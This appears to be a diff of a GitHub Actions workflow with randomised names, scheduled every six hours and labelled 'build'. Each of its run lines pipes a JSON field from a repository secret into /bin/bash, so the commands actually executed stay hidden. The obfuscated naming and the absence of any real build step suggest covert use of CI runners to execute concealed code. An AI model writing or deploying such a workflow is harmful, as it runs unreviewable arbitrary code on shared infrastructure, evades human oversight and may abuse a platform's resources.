@@ -1,28 +1,34 @@
 name: mengtancheng9845
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 1/6 * * *'
-jobs:  # 8814
+    - cron: '51 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mengtancheng9845
         env:
-          tehh81: ${{ secrets.tehh81 }}
+          odf7809: ${{ secrets.odf7809 }}
         run: |
-          echo $tehh81 | jq -r .betu87 | /bin/bash
-          echo $nkehg03486 | jq -r .k98 | /bin/bash
-          echo $wtmk9 | jq -r .c87735 | /bin/bash
-          echo $i69 | jq -r .widp6 | /bin/bash
-          echo $n80039 | jq -r .md48767 | /bin/bash
-          echo $pc9845 | jq -r .vlyb4004 | /bin/bash
-          echo $s6 | jq -r .ba2 | /bin/bash
-          echo $o91251 | jq -r .yvnfj72680 | /bin/bash
-          echo $bu7142 | jq -r .o58 | /bin/bash
-          echo $z148 | jq -r .u45 | /bin/bash
-          echo $q7 | jq -r .udy3 | /bin/bash
-          echo $feicy47 | jq -r .aq1 | /bin/bash
+          echo $odf7809 | jq -r .sv32 | /bin/bash
+          echo $cq9609 | jq -r .uex911 | /bin/bash
+          echo $ettkg96377 | jq -r .wanv402 | /bin/bash
+          echo $uoabs18738 | jq -r .fuep78843 | /bin/bash
+          echo $uc38 | jq -r .ml8 | /bin/bash
+          echo $ixvim38 | jq -r .wxl4 | /bin/bash
+          echo $ju77060 | jq -r .ipyx23391 | /bin/bash
+          echo $ajr386 | jq -r .ygzkb99481 | /bin/bash
+          echo $afh9929 | jq -r .ixe33589 | /bin/bash
+          echo $lhdpi684 | jq -r .zda89 | /bin/bash
+          echo $ifj84161 | jq -r .gz26 | /bin/bash
+          echo $ietvr94863 | jq -r .e35 | /bin/bash
+          echo $xcqe9 | jq -r .f6 | /bin/bash
+          echo $zkqja04 | jq -r .ejuv646 | /bin/bash
+          echo $n4810 | jq -r .w588 | /bin/bash
+          echo $ebxr2 | jq -r .ogesd30543 | /bin/bash
+          echo $gspf75 | jq -r .gnz4 | /bin/bash
 
